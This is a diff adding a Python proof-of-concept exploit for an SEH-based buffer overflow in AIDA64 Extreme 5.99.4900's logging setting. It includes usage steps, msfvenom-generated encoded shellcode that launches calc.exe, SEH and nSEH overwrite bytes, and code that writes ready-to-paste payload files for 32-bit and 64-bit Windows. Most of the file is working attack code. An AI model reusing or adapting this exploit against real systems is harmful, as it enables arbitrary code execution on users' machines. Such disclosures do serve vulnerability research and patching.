@@ -1,0 +1,91 @@
+#!/usr/bin/python                                                                                         #
+# Exploit Title: AIDA64 Extreme 5.99.4900 - Logging SEH Buffer Overflow                                   #
+# Date: 2019-04-02                                                                                        #
+# Vendor Homepage: https://www.aida64.com                                                                 #
+# Software Link: http://download.aida64.com/aida64extreme599.exe                                          #
+# Mirror Link : https://www.nikktech.com/main/downloads/finalwire/aida64extreme599.exe                    #
+# Exploit Author: Peyman Forouzan                                                                         #
+# Tested Version: 5.99.4900                                                                               #
+# Tested on: Winxp SP2 32-64 bit - Win7 Enterprise SP1 32-64 bit - Win10 Enterprise 32-64 bit             #
+# Special Thanks to my wife                                                                               #
+# Steps :                                                                                                 #
+#  1- Run python code : Aida64-Extreme.py ( Two files are created )                                       #
+#  2- App --> File --> Preferences --> Hardware Monitoring --> Logging --> paste in contents from the     #
+#     exploit-x32.txt or exploit-x64.txt (depend on your windows version)                                 #
+#     into "Log sensor reading to CSV log file : " --> OK                                                 #
+#  3- File --> Exit  (Do not directly close the program window, If you want to do this,                   #
+#      some codes must be changed - See the comments in code)                                             #
+#      --> Shellcode (Calc) open                                                                          #
+#---------------------------------------------------------------------------------------------------------#
+bufsize1 = 1120 # for windows-x32
+#bufsize1 = 1088 # for windows-x32 - if you directly close the program window
+bufsize2 = 1114 # for windows-x64
+#bufsize2 = 1082 # for windows-x64 - if you directly close the program window
+
+#msfvenom -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f python -a x86 --platform windows -v calc
+calc =  ""
+calc += "\x89\xe2\xdb\xd5\xd9\x72\xf4\x5b\x53\x59\x49\x49\x49"
+calc += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
+calc += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
+calc += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
+calc += "\x58\x50\x38\x41\x42\x75\x4a\x49\x39\x6c\x6d\x38\x6f"
+calc += "\x72\x35\x50\x75\x50\x45\x50\x45\x30\x4c\x49\x79\x75"
+calc += "\x64\x71\x49\x50\x52\x44\x4e\x6b\x70\x50\x64\x70\x6c"
+calc += "\x4b\x31\x42\x44\x4c\x4e\x6b\x73\x62\x57\x64\x4e\x6b"
+calc += "\x71\x62\x44\x68\x56\x6f\x78\x37\x32\x6a\x31\x36\x45"
+calc += "\x61\x39\x6f\x6c\x6c\x45\x6c\x30\x61\x33\x4c\x65\x52"
+calc += "\x44\x6c\x47\x50\x49\x51\x7a\x6f\x46\x6d\x37\x71\x4a"
+calc += "\x67\x39\x72\x78\x72\x46\x32\x32\x77\x4c\x4b\x43\x62"
+calc += "\x76\x70\x4c\x4b\x43\x7a\x47\x4c\x4e\x6b\x52\x6c\x62"
+calc += "\x31\x52\x58\x4a\x43\x51\x58\x37\x71\x68\x51\x70\x51"
+calc += "\x6e\x6b\x36\x39\x45\x70\x75\x51\x7a\x73\x4c\x4b\x42"
+calc += "\x69\x45\x48\x5a\x43\x36\x5a\x37\x39\x4e\x6b\x56\x54"
+calc += "\x6e\x6b\x73\x31\x4a\x76\x74\x71\x59\x6f\x4c\x6c\x69"
+calc += "\x51\x5a\x6f\x44\x4d\x77\x71\x48\x47\x64\x78\x79\x70"
+calc += "\x33\x45\x79\x66\x34\x43\x53\x4d\x5a\x58\x75\x6b\x51"
+calc += "\x6d\x76\x44\x63\x45\x79\x74\x51\x48\x4c\x4b\x30\x58"
+calc += "\x31\x34\x65\x51\x38\x53\x53\x56\x6e\x6b\x34\x4c\x30"
+calc += "\x4b\x6e\x6b\x46\x38\x57\x6c\x63\x31\x49\x43\x4e\x6b"
+calc += "\x34\x44\x6e\x6b\x35\x51\x38\x50\x6e\x69\x30\x44\x34"
+calc += "\x64\x35\x74\x31\x4b\x63\x6b\x45\x31\x73\x69\x63\x6a"
+calc += "\x62\x71\x39\x6f\x6b\x50\x33\x6f\x53\x6f\x52\x7a\x4e"
+calc += "\x6b\x72\x32\x38\x6b\x6c\x4d\x53\x6d\x32\x4a\x43\x31"
+calc += "\x6c\x4d\x6f\x75\x4c\x72\x45\x50\x77\x70\x67\x70\x76"
+calc += "\x30\x42\x48\x35\x61\x6c\x4b\x30\x6f\x4c\x47\x49\x6f"
+calc += "\x59\x45\x4f\x4b\x38\x70\x4e\x55\x4e\x42\x36\x36\x65"
+calc += "\x38\x6d\x76\x4c\x55\x4d\x6d\x6f\x6d\x79\x6f\x39\x45"
+calc += "\x55\x6c\x55\x56\x73\x4c\x74\x4a\x4f\x70\x39\x6b\x6b"
+calc += "\x50\x53\x45\x47\x75\x4d\x6b\x43\x77\x54\x53\x31\x62"
+calc += "\x50\x6f\x61\x7a\x77\x70\x32\x73\x39\x6f\x48\x55\x45"
+calc += "\x33\x73\x51\x50\x6c\x65\x33\x36\x4e\x53\x55\x62\x58"
+calc += "\x63\x55\x53\x30\x41\x41"
+
+jmpback1 = "\xe9\xa0\xfb\xff\xff"	# Jmp back
+#jmpback1 = "\xe9\xc0\xfb\xff\xff"	# Jmp back - if you directly close the program window
+jmpback2 = "\xe9\xa6\xfb\xff\xff"	# Jmp back
+#jmpback2 = "\xe9\xc6\xfb\xff\xff"	# Jmp back- if you directly close the program window
+
+nseh = "\xeb\xf9\x90\x90"			# Jmp Short back
+seh = "\x02\xeb\x1a\x01"			# Overwrite Seh # 0x011aeb02 : {pivot 8}
+
+buffer  = calc
+buffer += "\x41" * (bufsize1-len(buffer)-len(jmpback1))
+buffer += jmpback1
+buffer += nseh
+buffer += seh
+print "[+] Creating %s bytes payload for windows-x32 ..." %len(buffer)
+f = open ("exploit-x32.txt", "w")
+print "[+] File created!"
+f.write(buffer)
+f.close()
+
+buffer  = calc
+buffer += "\x41" * (bufsize2-len(buffer)-len(jmpback2))
+buffer += jmpback2
+buffer += nseh
+buffer += seh
+print "[+] Creating %s bytes payload for windows-x64 ..." %len(buffer)
+f = open ("exploit-x64.txt", "w")
+print "[+] File created!"
+f.write(buffer)
+f.close()
